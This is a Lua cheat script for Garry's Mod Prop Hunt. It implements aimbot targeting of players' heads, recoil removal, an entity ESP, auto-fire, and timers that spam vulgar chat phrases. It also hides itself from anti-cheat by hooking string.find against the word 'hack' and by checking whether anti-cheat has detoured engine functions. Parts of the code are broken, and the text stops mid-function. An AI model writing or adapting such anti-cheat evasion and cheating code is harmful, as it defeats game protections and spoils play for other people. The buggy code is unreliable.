

-- Declan's Prop Hunt Hax (PHH)

--[[SNAP_SAFE = false
local function AntiAntifrack(n, arg)
	print(n..":", unpack(arg))
	debug.Trace()
end
local oldRCC = RCC
function RCC(...)
	arg = arg or {}
	if arg[1] ~= "setinfo" and arg[1] ~= "-voicerecord" then
		AntiAntifrack("RCC", arg)
	end
	if SNAP_SAFE then
		oldRCC(unpack(arg))
	end
end
local oldPCC = _R.Player.ConCommand
function _R.Player.ConCommand(...)
	AntiAntifrack("PCC", arg)
	if SNAP_SAFE then
		oldPCC(unpack(arg))
	end
end]]
if true then return end
local RCC = RunConsoleCommand
oldSF = oldSF or string.find
function string.find(...)
	for k,v in pairs(arg) do
		if v=="h".."ack" then return false end
	end
	return oldSF(unpack(arg))
end
_G["GO!"] = function(ovr)
SNAP_HUDDETECTED = false
if not ovr then
	if debug.getinfo(RCC, "S").source ~= "=[C]" then
		print("The anti got to RCC first! Bailing!")
		print("AH AT"..debug.getinfo(RunConsoleCommand, "S").source)
		return
	end
	if debug.getinfo(_R.Vector.ToScreen, "S").source ~= "=[C]" then
		SNAP_HUDDETECTED = true
		print("ANTI-frack AT"..debug.getinfo(_R.Vector.ToScreen, "S").source)
	end
	if debug.getinfo(_R.Player.SetEyeAngles, "S").source ~= "=[C]" then
		print("The anti got to SEA first! Bailing!")
		print("ANTI-frack AT"..debug.getinfo(_R.Player.SetEyeAngles, "S").source)
		return
	end
end
-- Deco's Stuff :D
-- Set up
p					= LocalPlayer
local p = p
SNAP				= false
SNAP_HUD			= false
surface.CreateFont("arial", 12, 400, true, false, "PropHuntHax")
phh_Test	=	CreateClientConVar(	"phh_namething",			"",			true,	false)
phh_friends	=	CreateClientConVar(	"phh_friends",			"0",			true,	false)
phh_nospread	=	CreateClientConVar(	"phh_nospread",			"0",			true,	false)
phh_weaponspam	=	CreateClientConVar(	"phh_weaponspam",			"0",			true,	false)
phh_usespam	=	CreateClientConVar(	"phh_usespam",			"0",			true,	false)
phh_Classes	=	CreateClientConVar(	"phh_class",				"player",	true,	false)
phh_V		=	CreateClientConVar(	"phh_namev",				"",			true,	false)
phh_Team	=	CreateClientConVar(	"phh_teamthing",			"",			true,	false)
phh_Vis		=	CreateClientConVar(	"phh_vis",					"",			true,	false)
phh_Dist	=	CreateClientConVar( "phh_dist",					"0",		true,	false)
phh_DR		=	CreateClientConVar(	"phh_dr",					"0",		true,	false)
phh_vel		=	CreateClientConVar(	"phh_vel",					"0.23",		true,	false)
phh_mode	=	CreateClientConVar(	"phh_mode",					"0",		true,	false)
phh_jump	=	CreateClientConVar(	"phh_autojump",				"0",		true,	false)
phh_npcs	=	CreateClientConVar(	"phh_npcs",				"1",		true,	false)
phh_npcc	=	CreateClientConVar(	"phh_npcc",				"1",		true,	false)
phh_addheight	=	CreateClientConVar(	"phh_addheight",				"1",		true,	false)
phh_Superfire	=	CreateClientConVar(	"phh_superfire",				"0",		true,	false)
phh_players	=	CreateClientConVar(	"phh_players",				"1",		true,	false)
phh_copy	=	CreateClientConVar(	"phh_copy",				"",		true,	false)
phh_hudc	=	CreateClientConVar(	"phh_hudc",				"",		true,	false)
phh_noragdolls	=	CreateClientConVar(	"phh_noragdolls",				"",		true,	false)
phh_weapons	=	CreateClientConVar(	"phh_weapons",				"",		true,	false)
phh_cheap	=	CreateClientConVar(	"phh_cheap",				"",		true,	false)
phh_joygasm	=	CreateClientConVar(	"phh_joygasm",				"",		true,	false)
phh_br	=		CreateClientConVar(	"phh_br",				"0",		true,	false)
phh_brt	=		CreateClientConVar(	"phh_brt",				"0",		true,	false)
phh_brtsize	=		CreateClientConVar(	"phh_brtsize",				"0",		true,	false)
phh_keys	=		CreateClientConVar(	"phh_keys",				"0",		true,	false)
phh_spaz		=	CreateClientConVar(	"phh_spaz",					"0",			true,	false)
phh_flashspam		=	CreateClientConVar(	"phh_flashspam",					"0",			true,	false)
VecToScreen = _R.Vector.ToScreen
SNAP_COMP = 0
SNAP_PERFECT = false
SNAP_AS = false
SNAP_ADJUST = false
SNAP_PCONE = 0.9878307919932
SNAP_JUMP = false
SNAP_RELOADTIME		=	CreateClientConVar(	"phh_rt",					"3",			true,	false)
SNAPM = false
SNAP_V = false
SNAP_ACTIVITY = 0
SNAP_OPTIONS = {}
SNAP_GO = false
SNAP_TARGET = Vector(0,0,0)
SNAP_WEAPONS = {}
SNAP_ZOOMFOV = 20
SNAP_FOV = 90
SNAP_FOVT = false
SNAP_DEFFOV = 90
SNAP_FOVI = 5
SNAP_NOXEMOTES = {"drink a big bucket of shit","drink a big bucket of horse dick","lag!","speak english","bullshit","yay","shit","hax","fracks","h4x","h4cks","okay","derka","noes","get down","gtfo","gtho","yeah","rofl","lmao","run","run for your life","fantastic","headcrabs","headhumpers","hello","eek","uh oh","sodomy!","oops","shut up","shutup","right on","freeman","help","haxz","hi","let's go","lets go","moan","nice","noo","oh no","joygasm","zombies","da man","my house","party","watch out","excuse me","you sure?","groan","gasp","sorry","it's safer here","i'm talking to you","serve mankind","get going","go on out","get outta here","go on","hey","get in here","hit the road jack","no","never","you fool","good god","cheer","drive safely","whoops","gee thanks","what the hell","it's your pet the freakin headhumper","i'll stay here","up there","he's dead","lead the way","we're done for","over there","ok i'm ready","i'm with you","hey over here","behind you","follow me","pardon me","got one","finally","wait for me","i'm hurt","take cover","it's a manfrack","incoming","ready when you are","don't forget hawaii","that's enough outta you","wait for us","now what?","we trusted you","god i'm hungry","i'm ganna be sick","you're talking to yourself again","come on everybody","watch what you're doing","your mind is in the gutter","here they come","same here","i wouldn't say that too loud","i'll put it on your tombstone","have you ever had an original thought?","let's concentrate on the task at hand","keep your mind on your work","you never know","you never can tell","why are you telling me?","how about that","want a bet?","what am i supposed to do about it?","you talking to me?","leave it alone","can't you see i'm busy?","look out below","shouldn't we be doing something?","let's even the odds a little","oh god","should we bury him here?","what's the use?","what's the point?","this is bad","hold down this spot","i'm hurt","im hurt","sometimes i dream about cheese","i can't remember the last time i had a shower","watch what you're doing","you got it"}
SNAP_SPAMNOX = false
SNAP_ACTIVITIES_ENUM = {}
SNAP_CHECKS = {}
SNAP_SPECMAP = {
	[""] = {};
	zs_citadel_v3 = {Vector(1263.5, 694.5, 1517.5)};
	zm_forgotten_town = {Vector(-2793.4077, 1690.8090, -104.4288),Vector(-1837.0040, 2129.4285, -135.1922)};
}
SNAP_CONE_TO_DIST = 0.001
function CurMap()
	local mapp = ""
	string.gsub(Entity(0):GetModel(), "[/\\](.*)%.bsp", function(a) mapp = a end)
	return mapp
end
SNAP_GOODWEP = "use weapon_357;use gunner_gun;use human_gun"
SNAP_FRAMETRACE = {}
function AddSnapCheck(name, func)
	SNAP_CHECKS[name] = func
end
function ModelExt(m)
	local mt = string.Explode("/", m or "ERROR")
	local s = mt[#mt] --zzzzzzzzz
	return string.sub(s, 0, string.len(s)-4)
end
function CheckTarget(v)
	local good_target, curres = true,nil
	for k,v in pairs(SNAP_CHECKS) do
	end
end
function wep()
	return p():GetActiveWeapon()
end
for k,v in pairs(_G) do
	if string.sub(k, 1, 4) == "ACT_" then
		SNAP_ACTIVITIES_ENUM[v] = k
	end
end
function SpamEmotes()
	if SNAP_SPAMNOX then
		RCC("say", SNAP_NOXEMOTES[math.floor(math.random(1, #SNAP_NOXEMOTES))])
	end
end	timer.Create("phh_spamnox", 0.1, 0, SpamEmotes)
	timer.Start("phh_spamnox")
function SpamEmotes()
	if phh_joygasm:GetBool() then
		RCC("say", "joygasm")
	end
end	timer.Create("phh_joygasm", 2.5, 0, SpamEmotes)
	timer.Start("phh_joygasm")
function SpamEmotesCC(lolfail, sillycmd, args)
	SNAP_SPAMNOX = args[1] ~= ""
end concommand.Add("phh_spamnox", SpamEmotesCC)
function AddSnapWep(name, data)
	SNAP_WEAPONS[name] = data
end
function AddSnapOption(v)
	table.insert(SNAP_OPTIONS, v)
end
function DummyTrue() return true end
function Distance(v)
	local d = v:GetPos():Distance(p():GetShootPos())
	Msg(d.."\n")
	return d
end
function GetWepVal(t, v, i)
	if not t then return "NULL" end
	if t[v] then
		return t[v]
	end
	if t.Primary and t.Primary[v] then
		return t.Primary[v]
	end
	if t["Primary"..v] then
		return t["Primary"..v]
	end
	if t["data"] then
		for _,d in pairs(t["data"]) do
			if type(d)=="table" and d[v] then return d[v] end
		end
	end
	if t.BaseClass and (i or 0)<10 then
		return GetWepVal(t.BaseClass, v, (i or 0)+1)
	end
	return "NULL"
end
function GetWeaponInfo(w, dist, noclip)
	local WepData = {}
	WepData.wname = "NULL"
	WepData.Damage = "NULL"
	WepData.Cone = "NULL"
	WepData.ConeMoving = "NULL"
	WepData.ConeCrouching = "NULL"
	WepData.Delay = "NULL"
	WepData.Clip = "NULL"
	WepData.MaxClip = "NULL"
	WepData.NumShots = "NULL"
	WepData.Rating = 0
	WepData.Class = "NULL"
	if w and (type(w) == "Entity" or type(w) == "Weapon") and w:IsValid() then
		WepData.wname = w:GetPrintName()
		local tab = w:GetTable()
		WepData.Class = w:GetClass()
		if tab then
			WepData.Cone = GetWepVal(tab, "Cone")
			WepData.Damage = GetWepVal(tab, "Damage")
			WepData.ConeMoving = GetWepVal(tab, "ConeMoving")
			WepData.ConeCrouching = GetWepVal(tab, "ConeCrouching")
			WepData.Delay = GetWepVal(tab, "Delay")
			if not noclip then WepData.Clip = w:Clip1() end
			WepData.MaxClip = GetWepVal(tab, "ClipSize")
			WepData.NumShots = GetWepVal(tab, "NumShots")
		end
		WepData.Rating = GetWeaponRating(WepData.NumShots, WepData.Damage, WepData.Delay, WepData.Cone, WepData.MaxClip, WepData.Clip, dist, noclip)
	end
	return WepData
end
function IfNaN(v, e)
	if type(v) ~= "number" then
		return e or 1
	end
	return v
end
function GetWeaponRating(Shots, Damage, Delay, Cone, MaxClip, Clip, Dist, noclip)
	if MaxClip == -1 then MaxClip = 1 end
	if Clip == -1 then Clip = 1 end
	if Clip == 0 and not noclip then return -9999999 end
	if not Dist then
		return (IfNaN(Damage)*IfNaN(Shots, 1))/IfNaN(Delay)
	else
		return (IfNaN(Damage)*IfNaN(Shots, 1))/IfNaN(Delay)*math.abs((1-IfNaN(Cone))/SNAP_CONE_TO_DIST-Dist)/Dist
	end
	return 0
end
local no_change_to_ids = {
	"axe",
	"knife",
	"hammer",
	"shovel",
	"stunstick",
	"crowbar",
	"snowball",
}
function string.table_find(s, t)
	for k,v in pairs(t) do
		if string.find(s, v) then
			return true
		end
	end
	return false
end
function GetBestWeapon(e, k)
	local Best, v2, info = 0, nil, nil
	for k,v in pairs(p():GetWeapons()) do
		if e and e:IsValid() then
			e = Distance(e)
		else
			e = nil
		end
		if k and string.table_find(v:GetClass(), no_change_to_ids) then
		else
			info = GetWeaponInfo(v, e)
			if  info.Rating > Best then
				Best = info.Rating
				v2 = v
			end
		end
	end
	return v2
end
function Shotgun(v) return Distance(v) > 650 end
--Configs
-- AddSnapCheck( any name, function func )
--	This for for checking if the target is good to shoot at or not.
--	Checking Visibility, Checking Name, etc
-- AddSnapWep( string class_name, table data )
--	Class_name is identifier for the weapon. E.G: The pistol is "weapon_pistol"
--	Data is a table, the options are:
--		- bad [Function] ( Entity v , Entity w, Player p)
--			Params: v, the entity going to be aimed for. w, the weapon been held. p, the local player.
--			Returns: A boolean, true for suitable weapon, false to change to next best.
--			Purpose: Good for changing weapons if out of ammo, if long distance/short distance,
--				if taking too long to charge etc.
--				Useful for gravgun, if it doesn't obey VPHYSICS, is too heavy or etc then change weps
--		- trace [Function] ( Entity v , Vector vec, Player p)
--			Params: v, the entity going to be aimed for. vec, the locaiton best for that model (World). p, local player
--			Returns: A boolean, true for suitable weapon, false to change to next best.
--			Purpose: Good for changing weapons if out of ammo, if long distance/short distance,
--				if taking too long to charge etc.
--				Useful for gravgun, if it doesn't obey VPHYSICS, is too heavy or etc then change weps
--		- automatic [Boolean]
--			Purpose: If true, don't pulse +attack for autoshoot, just hold.		
--
AddSnapWep("weapon_physgun",	{ bad = DummyTrue })
AddSnapWep("gmod_tool",			{ bad = DummyTrue })
AddSnapWep("gmod_camera",		{ bad = DummyTrue })
AddSnapWep("weapon_physcannon", {
	bad = function (v) return not table.HasValue({4,5,6}, v:GetMoveType()) end
})
AddSnapWep("weapon_smg1",		{automatic = true})
AddSnapWep("weapon_ar2",		{automatic = true})
AddSnapWep("weapon_357",		{automatic = false})
AddSnapWep("weapon_pumpshotgun",{bad = Shotgun})
AddSnapWep("weapon_shotgun",{bad = Shotgun})
AddSnapWep("weapon_crossbow",	{
	aim = function(v, vec, p) end,
	bad = DummyTrue
})
AddSnapWep("flechette_gun",	{
	aim = function(v, vec, p)
		
	end
})

-- Some handy utility functions
function HSVtoRGB( Hcolor, Scolor, Vcolor)
	local formulai
	local formulaf, formulap, formulaq, formulat

	if( Scolor == 0 ) then
		-- achromatic (grey)
		Rcolor = Vcolor
		Gcolor = Vcolor
		Bcolor = Vcolor
		if not Rcolor then Rcolor = 0 end
		if not Gcolor then Gcolor = 0 end
		if not Bcolor then Bcolor = 0 end
		return Rcolor, Gcolor, Bcolor
	end

	Hcolor = Hcolor/60			-- sector 0 to 5
	formulai = math.floor(Hcolor)
	formulaf = Hcolor - formulai			-- factorial part of h
	formulap = Vcolor * ( 1 - Scolor )
	formulaq = Vcolor * ( 1 - Scolor * formulaf );
	formulat = Vcolor * ( 1 - Scolor * ( 1 - formulaf ) );

	if formulai == 0 then
		Rcolor = Vcolor;
		Gcolor = formulat;
		Bcolor = formulap;
	elseif formulai == 1 then
		Rcolor = formulaq;
		Gcolor = Vcolor;
		Bcolor = formulap;
	elseif formulai == 2 then
		Rcolor = formluap;
		Gcolor = Vcolor;
		Bcolor = formulat;
	elseif formulai == 3 then
		Rcolor = formulap;
		Gcolor = formulaq;
		Bcolor = Vcolor;
	elseif formulai == 4 then
		Rcolor = formulat;
		Gcolor = formulap;
		Bcolor = Vcolor;
	elseif formulai == 5 then
		Rcolor = Vcolor;
		Gcolor = formulap;
		Bcolor = formulaq;
	else
		-- FAIL!
	end
	if not Rcolor then Rcolor = 0 end
	if not Gcolor then Gcolor = 0 end
	if not Bcolor then Bcolor = 0 end
	return Rcolor,Gcolor,Bcolor
end
SNAP_COLORHASHES = {}
function ColorHash(name)
	if SNAP_COLORHASHES[name] then return SNAP_COLORHASHES[name] end
	local currenthash = 5381
	local namelength = string.len(name)
	for n = 1, namelength do
		currenthash = 33*currenthash + string.byte(name, n)
	end
	--DEFAULT_CHAT_FRAME:AddMessage("currenthash: "..currenthash)
	local Hcolor = math.fmod(currenthash, 360)
	if (Hcolor > 220) and (Hcolor < 270) then
		Hcolor = Hcolor + 60
	end
	local R, G, B = HSVtoRGB(Hcolor, 1, 1)
	local retval = Color(R*256, G*256, B*256, 255)
	SNAP_COLORHASHES[name] = retval
	return retval
end
function PredictBulletVelocity(shootpos, bulletspeed, ent)
	local BulVel = Vector()
	local vel = ent:GetVelocity()
	local pos = ent:LocalToWorld(found:OBBCenter())
	local a = (pos.y-shootpos.y)/(pos.x-shootpos.x)
	local b = (pos.z-shootpos.z)/(pos.x-shootpos.x)
	local c = 1+a^2+b^2
	local d = -2*vel.x*(a^2+b^2)+2*(vel.y*a+vel.z*b)
	local e = vel.x^2*(a^2+b^2)-2*vel.x(a*vel.y+b*vel.z)+vel.y^2+vel.z^2-bulletspeed^2
	BulVel.x = (-1*d+(d^2-4*c*e)^0.5)/(2*c)
	BulVel.y = a*(BulVel.x-vel.x)
	BulVel.z = b*(BulVel.x-vel.x)

	return BulVel
end
--Some handy debugging functions
SNAP_DEBUGI = 0
function m()
	Msg(SNAP_DEBUGI.."\n")
	SNAP_DEBUGI = SNAP_DEBUGI + 1
end
function mi()
	SNAP_DEBUGI = 0
end
--The inner workings
lastv2 = nil
function CheckDistCheck(v, p)
	if phh_Dist:GetInt() > 0 then
		return v:GetPos():Distance(p:GetShootPos()) < phh_Dist:GetInt()
	end
	return true
end
function CheckNameCheck(v)
	if v:GetFriendStatus() == "friend" and not phh_friends:GetBool() then
		return false
	end
	if v:GetActiveWeapon() and v:GetActiveWeapon():IsValid() then
		if v:GetActiveWeapon():GetPrintName() == "Chem-Zombie"
		 and v:GetPos():Distance(p():GetShootPos()) < 350 then
			return false
		end
	end
	local c_r,c_g,c_b,c_a = v:GetColor()
	if v:GetMaterial() == "models/shiny" and c_a > 200 then return false end
	local r,g,b,a = v:GetColor()
	if r==255 and g==0 and b==0 and a==255 then return false end
	local all = false
	if !v:IsPlayer() then return false end
	if phh_Test:GetString() ~= "" then
		local names = string.Explode(",",phh_Test:GetString())
		for k,va in pairs(names) do
			local rev = true
			local eqq = false
			if string.sub(va,1,1) == "!" then
				va = string.sub(va,2)
				rev = false
			end
			if string.sub(va,1,1) == "=" then
				va = string.sub(va,2)
				eqq = true
			end
			if eqq and v:Name() == va then
				return rev
			elseif !eqq and string.find(v:Name() or "", va) then
				return rev
			end
			if va == "all" then
				all = true
			end
		end
	end
	return all
end
function CheckNPCClass(v)
	if !v:IsNPC() and v:GetClass() ~= "omg_rpg_missile" then return false end
	if phh_npcc:GetString() ~= "" then
		local names = string.Explode(",",phh_npcc:GetString())
		for k,va in pairs(names) do
			if v:GetClass() == va then
				return false
			end
		end
		return true
	end
	return true
end
function CheckHUDCheck(v)
	local all = false
	if phh_hudc:GetString() ~= "" then
		local names = string.Explode(",",phh_hudc:GetString())
		for k,va in pairs(names) do
			local rev = true
			local eqq = false
			if string.sub(va,1,1) == "!" then
				va = string.sub(va,2)
				rev = false
			end
			if string.sub(va,1,1) == "=" then
				va = string.sub(va,2)
				eqq = true
			end
			if eqq and v:GetClass() == va then
				return rev
			elseif !eqq and string.find(v or "", va) then
				return rev
			end
			if va == "all" then
				all = true
			end
		end
	end
	return all
end
function CheckTeamCheck(v)
	if !v:IsPlayer() then return false end
	if phh_Team:GetString() == "!" then
		return v:Team() ~= p():Team()
	end
	if phh_Team:GetString() ~= "" then
		if SNAPINT then
			return not (string.find(team.GetName(v:Team()) or "", phh_Team:GetString()) or v:Team() == phh_Team:GetFloat())
		else
			return string.find(team.GetName(v:Team()) or "", phh_Team:GetString()) or v:Team() == phh_Team:GetFloat()
		end
	end
	return true
end
function reloadTimer()
	RCC("+reload")
	timer.Simple(0.3,reloadTimer2)
end
function reloadTimer2()
	RCC("-reload")
end
SNAP_PULSE = true
SNAP_FIRE = false
SNAP_GRAVSTAGE = 0
function RemoveRagdolls()
	if phh_noragdolls:GetBool() then
		for k,v in pairs(ents.GetAll()) do
			if table.HasValue({"gib","client_ragdoll"},v:GetClass())then
				v:Remove()
			end
		end
	end
end
timer.Create("PHH_RAGDOLLS",0.1,0,RemoveRagdolls)
timer.Start("PHH_RAGDOLLS")
SNAP_MODELS = {}
function AddSnapModel(name, data)
	SNAP_MODELS[name] = data
end
AddSnapModel("models/zombie/classic_torso.mdl", {
	pos = function (v,p,w)
		-- attachment 2 = head
		return v:GetAttachment(2).Pos
	end
})
AddSnapModel("models/zombie/fast.mdl", {
	pos = function (v,p,w)
		-- attachment 2 = head
		return v:GetAttachment(2).Pos
	end
})
AddSnapModel("models/zombie/poison.mdl", {
	pos = function (v,p,w)
		-- attachment 2 = head
		return v:GetAttachment(2).Pos
	end
})

function PropHuntTarget(v)
	local vec = Vector(0,0,0)
	if SNAP_MODELS[string.lower(v:GetModel()) or "ERROR"] then
		return SNAP_MODELS[v:GetModel()].pos(v,p(),wep())
	end
	if string.find(string.lower(v:GetModel() or "ERROR"), "zombie") then
		return v:GetPos() + Vector(0,0,55) + v:GetAngles():Forward()*4
	end
	if string.find(string.lower(v:GetModel() or "ERROR"), "torso") then
		return v:GetAttachment(v:LookupAttachment("headcrab")).Pos
	end
	--Msg("1\n")
	local atch = v:LookupAttachment("head")
	--Msg((v:GetModel() or "ERROR").." :LOL:"..tostring(atch).."\n")
	if atch ~= 0 then
	--Msg("2\n")
		local atchthing = v:GetAttachment(atch)
		--Msg(tostring(atchthing).."\n")
		if atchthing then
		--Msg("3\n")
			return atchthing.Pos
		end
	end
	local boney = v:LookupBone("ValveBiped.Bip01_Head1")
	if boney ~= 0 then
	--Msg("4\n")
		vec = v:GetBonePosition(boney)
	else
	--Msg("5\n")
		vec = v:LocalToWorld(v2:OBBCenter())
	end
	return (vec or Vector(0,0,0))--+(v:GetVelocity()*p():Ping()/1000)+(p():GetVelocity()*FrameTime()/1000)*SNAP_COMP
end
function CheckVis(v)
	local pos = PropHuntTarget(v)
	if SNAP_PERFECT then
		local pang = (pos - p():GetShootPos()):Normalize():DotProduct(p():GetAimVector())
		if pang < (SNAP_PCONE or 0) then return false end
	end
	if phh_Vis:GetString() == "1" then
		local pll = p():GetShootPos()
		local tracedata = {}
		tracedata.start = pll
		tracedata.endpos = pos
		tracedata.filter = {p()}
		if v:IsPlayer() then
			if v:InVehicle() then
				table.insert(tracedata.filter, v:GetVehicle())
			end
		end
		tracedata.mask = MASK_SHOT
		local trace = util.TraceLine(tracedata)
		--local angthingy = (vec-p():GetShootPos()):Angle()-p():EyeAngles()
		--if SNAP_PERECT and not ((angthingy < Angle(10,10,10)) and (angthingy > Angle(-10,-10,-10))) then
		--	return false
		--end
		return (trace.Entity == v) or (trace.Fraction > 0.9999)
	end
	return true
end
function DefaultFire()
	if SNAP_PULSE then
		RCC("+attack")
	else
		RCC("-attack")
	end
	SNAP_PULSE = !SNAP_PULSE
	SNAP_LASTFIRE = CurTime()
end
function UberWeps(tab)
	if tab.BaseClass then
		UberWeps(tab.BaseClass)
	end
	if tab.Primary then
		tab.Primary.Recoil = 0
	end
	tab.Recoil = 0
end

SNAP_JUSTUSE = false
SNAP_USEPULSE = false
SNAP_USEDELAY = 0.1
SNAP_LASTUSE = CurTime()
SNAP_DEBUG = false
function Bug(...)
	if SNAP_DEBUG then
		print("DEBUG:", unpack(arg))
	end
end
SNAP_LASTFIRE = CurTime()
SNAP_INTERVAL = 0.01
SNAP_DEFAULTFIRE = 0.01
SNAP_JUSTHADENEMY = false
SNAP_PULSE = false
SNAP_LASTTHINK = 0
SNAP_LASTHUD = CurTime()
SNAP_HUDDELAY = 5
SNAP_HUDENTS = {}
SNAP_RESPAWNINTERVAL = 3
SNAP_TARGET_DELAY = 0.25
SNAP_TARGET_LAST = CurTime()
SNAP_SPAWNS = SNAP_SPAWNS or {}
SNAP_SAIDS = 3
local CurTime = CurTime
function TimerThing()
	local wep = p():GetActiveWeapon()
	local defshoot = false
	if p():KeyDown(IN_ATTACK) and not SNAP_FIRE then
		SNAP_ACTIVITY = SNAP_ACTIVITY+1
	end
	if (phh_usespam:GetBool()) and CurTime() > SNAP_LASTUSE+SNAP_USEDELAY then
		SNAP_LASTUSE = CurTime()
		SNAP_JUSTUSE = true
		if SNAP_USEPULSE then
			RCC("+use")
			Bug("+use")
		else
			RCC("-use")
			Bug("-use")
		end
		SNAP_USEPULSE = !SNAP_USEPULSE
	end
	if SNAP_JUSTUSE and not ((SNAP_AS) or phh_usespam:GetBool()) then
		RCC("-use")
		Bug("just -use")
		SNAP_JUSTUSE = false
	end
	if SNAP_AS and SNAP_ACTIVITY == 0 and (not p():KeyDown(IN_ATTACK)) then
		reloadTimer()
	end
	if SNAP_AS and (not p():Alive()) and (CurTime() > (SNAP_LASTFIRE + SNAP_INTERVAL + SNAP_RESPAWNINTERVAL)/2) then
		if SNAP_PULSE then
			RCC("+attack")
		else
			RCC("-attack")
		end
		SNAP_LASTFIRE = CurTime()
		SNAP_PULSE = !SNAP_PULSE
	elseif p():Alive() and wep and wep:IsValid() then
		--[[local weptab = wep:GetTable()
		UberWeps(weptab)
		if (SNAP_AS and SNAP_FIRE) or phh_Superfire:GetBool() then
			if weptab and weptab.Primary then
				weptab.Primary.Recoil = 0
				if weptab.Primary.Automatic or (SNAP_WEAPONS[wep:GetClass()] and SNAP_WEAPONS[wep:GetClass()].automatic) then
					RCC("+attack")
					Bug("AUTO AS")
				elseif SNAP_WEAPONS[wep:GetClass()] and type(SNAP_WEAPONS[wep:GetClass()].delay) == "number"
				and (CurTime() > (SNAP_LASTFIRE + SNAP_INTERVAL + SNAP_WEAPONS[wep:GetClass()].delay)/2) then
					DefaultFire()
					Bug("TABLE AS")
				elseif type(weptab.Primary.Delay) == "number" and (CurTime() > (SNAP_LASTFIRE + SNAP_INTERVAL + weptab.Primary.Delay)/2) then
					DefaultFire()
					Bug("WEAPON AS")
				else
					defshoot = true
					Bug("NO WEPTAB CONTENT AS")
				end
			else
				Bug("NO WEPTAB AS")
				defshoot = true
			end
		end]]
	end
	if defshoot then
		if SNAP_WEAPONS[wep:GetClass()] and SNAP_WEAPONS[wep:GetClass()].automatic then
			RCC("+attack")
			Bug("AS DEF AUTO")
		elseif CurTime() > (SNAP_LASTFIRE + SNAP_INTERVAL + SNAP_DEFAULTFIRE) then
			if SNAP_PULSE then
				RCC("+attack")
			else
				RCC("-attack")
			end
			Bug("AS DEF:", SNAP_PULSE)
			SNAP_LASTFIRE = CurTime()
			SNAP_PULSE = !SNAP_PULSE
		end
	end
	if !SNAP_FIRE and (SNAP_JUSTHADENENMY or SNAP_AS) then
		RCC("-attack")
		SNAP_JUSTHADENEMY = false
	end
	if CurTime() > SNAP_LASTHUD + SNAP_HUDDELAY then
		for k,v in pairs(SNAP_SPAWNS) do
			for kk,s in pairs(SNAP_SPAWNS) do
				if v and s and s ~= v then
					if v[2]:Distance(s[2]) < 15 then
						table.remove(SNAP_SPAWNS, kk)
					end
				end
			end
		end
		if wep:IsValid() then
			tab = wep:GetTable() or {}
			if not tab.MAH_VIEWED then
				function tab:ViewModelDrawn()
					hook.Call('DrawClientStuff', nil, self)
				end
				tab.MAH_VIEWED = true
			end
		end
		local done, data = false, {}
		local WepsHeld = {}
		SNAP_HUDENTS = {}
		for k,v in pairs(ents.GetAll()) do
			done = false
			data = {}
			if v:IsPlayer() and (CheckHUDCheck("self") or v ~= p()) then
				done = true
				local ww = v:GetActiveWeapon()
				if ww and ww:IsValid() then
					wn = ww:GetPrintName()
					wc = ww:Clip1() or "NULL"
					wa = v:GetAmmoCount(ww:GetPrimaryAmmoType() or "") or "NULL"
				else
					wn = ""
					wc = "NULL"
					wa = "NULL"
				end
				data = {
					team = team.GetName(v:Team()),
					name = v:Name(),
					weapon = wn,
					model = ModelExt(v:GetModel()),
					ammo = wa,
					clip = wc,
				}
				for _,c_w in pairs(v:GetWeapons()) do
					WepsHeld[c_w:EntIndex()] = true
				end
			end
			if phh_npcs:GetBool()
			and v:IsValid() and (v:IsNPC() or string.find(v:GetClass(), "npc_") or v:GetClass() == "omg_rpg_missile") then
				done = true
			end
			if v:IsWeapon() and !v:IsCarriedByLocalPlayer() 
				and v:GetMoveType() == 6
				and (not WepsHeld[v:EntIndex()]) and CheckHUDCheck(v:GetClass()) then
				done = true
			end
			if v:IsWeapon() and v:IsCarriedByLocalPlayer() then
				--done = true
			end
			if !done and v and v:IsValid() and CheckHUDCheck(v:GetClass()) and not WepsHeld[v:EntIndex()] then
				done = true
			end
			if done == true then
				table.insert(SNAP_HUDENTS, {v, data})
			end
		end
	end
end hook.Add("Think", "!", TimerThing)
local WEAPON_SELECT
function AllThatStuff()
	SNAP_ACTIVITY = math.Clamp(SNAP_ACTIVITY-FrameTime(), 0, SNAP_RELOADTIME:GetFloat())
	local pos = p():GetShootPos()
	local tracedata = {}
	tracedata.start = pos
	tracedata.endpos = pos+p():GetAimVector()*16800
	tracedata.filter = {p()}
	tracedata.mask = MASK_SHOT
	SNAP_FRAMETRACE = util.TraceLine(tracedata)
	local light = DynamicLight(997)
	if phh_brt:GetFloat() <= 0 then light = nil end
	if light then
		light.Pos = SNAP_FRAMETRACE.HitPos
		light.r = 255
		light.g = 255
		light.b = 255
		light.Brightness = phh_brt:GetFloat()
		light.Size = phh_brtsize:GetFloat()
		light.Decay = 512*5
		light.DieTime = CurTime() + 5
	end
	local light = DynamicLight(998)
	if phh_br:GetFloat() <= 0 then light = nil end
	if light then
		light.Pos = p():GetShootPos()
		light.r = 255
		light.g = 255
		light.b = 255
		light.Brightness = phh_br:GetFloat()
		light.Size = 1024
		light.Decay = 512*5
		light.DieTime = CurTime() + 5
	end
	if SNAP_ADJUST and CurTime()>SNAP_PADJ+0.5 then
		local tracedata = {}
		tracedata.start = pos
		tracedata.endpos = pos+p():GetCursorAimVector()*16800
		tracedata.filter = {p()}
		tracedata.mask = MASK_SHOT
		local tres = util.TraceLine(tracedata)
		local opposite = tres.HitPos:Distance(SNAP_FRAMETRACE.HitPos)
		local ajacent = tres.HitPos:Distance(pos)
		SNAP_PCONE = math.cos(math.atan(opposite/ajacent))
	end
	local fovt = 0
	if SNAP_FOVT then
		fovt = SNAP_ZOOMFOV
	else
		fovt = SNAP_DEFFOV
	end
	if math.abs(fovt - SNAP_FOV) < (SNAP_DEFFOV-SNAP_ZOOMFOV)/(SNAP_FOVI-1) then
		SNAP_FOV = fovt
	elseif SNAP_FOV < fovt then
		SNAP_FOV = SNAP_FOV+(SNAP_DEFFOV-SNAP_ZOOMFOV)/SNAP_FOVI
	else
		SNAP_FOV = SNAP_FOV-(SNAP_DEFFOV-SNAP_ZOOMFOV)/SNAP_FOVI
	end
	SNAP_TARGET = Vector(0,0,0)
	SNAP_GO = false
	if SNAP or SNAP_PERFECT then
		local v2		= nil
		ph_props = ents.GetAll()
		for k,v in pairs(ph_props) do
			if phh_players:GetBool() and v:IsPlayer() and v:UserID() ~= p():UserID() and v:Alive() and
				CheckNameCheck(v) and CheckTeamCheck(v) and CheckVis(v) and CheckDistCheck(v, p())
				and v:Health() > 0 then
				if v2 and v2:IsValid() then
					if v:GetPos():Distance(p():GetShootPos())<v2:GetPos():Distance(p():GetShootPos()) then
						v2 = v
					end
				elseif v:IsPlayer() and v:Alive() and v2 == nil then
					v2 = v
				end
			end
